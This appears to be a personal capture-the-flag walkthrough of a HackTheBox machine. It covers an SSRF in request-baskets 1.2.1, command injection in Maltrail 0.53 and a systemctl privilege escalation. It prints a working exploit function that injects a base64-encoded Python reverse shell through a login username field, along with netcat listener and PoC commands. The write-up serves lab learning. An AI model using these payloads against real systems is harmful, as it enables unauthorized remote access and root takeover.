## Comments

This box is straightforward but during my challenge I spent way too long trying to troubleshooting a trivial mistake. I kept trying to get a reverse shell from the target to local but it just didn't work.

I tried all types of revshell methods, tested locally (worked), different encodings, etc. And after hours of searching, I realised that I had left my ufw enabled meaning that all incoming traffic was blocked, even if my netcat was listening for a reverse shell.

Lesson learnt. Check firewall connections!!!

Other than that, I was able to complete this box without referring to a walkthrough. I enumerated properly and found the right exploits by looking for abnormal processes/ functions running in the box. This box taught me that understanding the underlying function/ source code of a machine is key to understand its weaknesses.


## Walkthrough

Target IP: 

    10.10.11.224

### Enumeration

First, nmap scan. While waiting, we also check `10.10.11.224` in the browser but it doesnt load.

Nmap returns ports 22, 80, and 55555 (unknown service). 

    PORT      STATE    SERVICE REASON      VERSION

    80/tcp    filtered http    no-response

    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Immediately, we can see that 55555 is actually a HTTP port because it is returning HTTP responses to our scan.

Notice that we also have a HTTP port 80 that is inaccessible because it is filtering connections. That's why our browser couldn't connect

Surprisingly, one of the scans which points to port 55555's `/web` endpoint received a `302 Found`:

    |   GetRequest: 
    |     HTTP/1.0 302 Found
    |     Content-Type: text/html; charset=utf-8
    |     Location: /web
    |     Date: Sun, 08 Oct 2023 04:31:20 GMT
    |     Content-Length: 27
    |     href="/web">Found</a>.

Trying `http://10.10.11.224:55555/web` in the browser returns a request-baskets v1.2.1 form submission page.

At this point, it's good practice to read up on the service:

[request-baskets](https://github.com/darklynx/request-baskets)
> Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI.

### Foothold

Version 1.2.1 already has a vulnerability in its HTTP forwarding function that can be exploited to conduct SSRF (Server-Side Request Forgery) attacks. This means that an attacker can trigger commands in the server as if they were executed internally (hence server-side).

There is a [PoC](https://github.com/entr0pie/CVE-2023-27163) and a detailed [tutorial](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7) on this.

So how does request forwarding lead to SSRF?

> "Request-baskets is a web application built to collect and register requests on a specific route, so called basket. When creating it, the user can specify another server to forward the request. The issue here is that the user can specify unintended services, such as network-closed applications. <br><br> For example: let's suppose that the server hosts Request-baskets (port 55555) and a Flask web server on port 8000. The Flask is also configured to only interact with localhost. By creating a basket which forwards to http://localhost:8000, the attacker can access the before restricted Flask web server."

How do we implement this?

1. Create a new basket that we can send our requests to.
2. Tell this basket to forward all requests to the server-side web server on port 80 (http://127.0.0.1:80 - this is same as localhost:80). This allows us to get past the filtering applied to port 80.

Run the PoC `.sh` file and specify `[request-basket-URL]` and `[forward-URL]`:

    sudo ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80

    > Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

    > Creating the "rgvakm" proxy basket...
    > Basket created!
    > Accessing http://10.10.11.224:55555/rgvakm now makes the server request to http://127.0.0.1:80.
    > Authorization: l_nywtHy0kaGp8qqfc7mGv7Bw8UiIrLDQ0Ye4xpYgIcq

Now if we access `http://10.10.11.224:55555/rgvakm` we get the response from `http://127.0.0.1:80` and can see that the port 80 service is actually running a Maltrail (v0.53) web app.

### Remote Code Execution

A quick search shows that this version of Maltrail is vulnerable to RCE via OS Command Injection. Meaning, we can get a reverse shell by injecting a command that gets directly executed by the CLI.

We can use this [PoC](https://github.com/spookier/Maltrail-v0.53-Exploit#weaponized-exploit-for-maltrail-v053-unauthenticated-os-command-injection-rce ) for creating the payload.

The reason this exploit works is that Maltrail calls a function that executes a shell command that takes the user-input `username` directly from the login page and uses it without sanitation.

Hence, we can craft a `username` that includes `;` to break the shell commands and insert out own.

The code in the exploit script itself is actually very straightforward. 

    def curl_cmd(my_ip, my_port, target_url):
        payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
        encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
        command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
        os.system(command)


1. It first constructs a standard Python3 reverse shell command. We can check out [revshell](https://revshells.com) for similar scripts.
2. Then base64 encode it 
3. Using `curl`, POST to the Maltrail login URL with username containing the full payload. 


!! Important !!

Notice that the Maltrail exploit requires the POST to be sent to the `/login` endpoint. This means our basket needs to point to `http://127.0.0.1:80/login` instead.

We can call the request-basket exploit `.sh` again to create a new basket that does this.

    sudo ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login

    ...
    > Accessing http://10.10.11.224:55555/mdgwtj now makes the server request to http://127.0.0.1:80/login.

We now have our target URL `http://10.10.11.224:55555/mdgwtj`. 

Once, we set up a nc listener 

    sudo nc -lvnp 1234

We can start the reverse shell:

    python3 exploit.py [LOCAL_IP] 1234 http://10.10.11.224:55555/mdgwtj


*At this point, I was actually stuck because I didn't realise my ufw was enabled and blocking all incoming connections. The issue was exacerbated by the machine being super laggy at the time and my requests kept getting timed out.*

Upon getting the reverse shell, user.txt = 3ff7439b35b02e60070d4e518f195739

### Privilege Escalation

Similar to previous boxes, the first thing I checked was sudo root privileges on the current user.

    sudo -l

    >> User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

Lukcy for us, `puma` can run the binary `systemctl` to show `status` on a specific service `trail.service`.

According to [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/), we simply start systemctl exactly as shown. And then continue to open a shell within systemctl.

    /usr/bin/systemctl status trail.service

    !sh

    >>
    $ (root shell opened)

We are now root. root.txt = e866331864c2113685cef4b22892feb8

*That's all for tonight, ciao.*
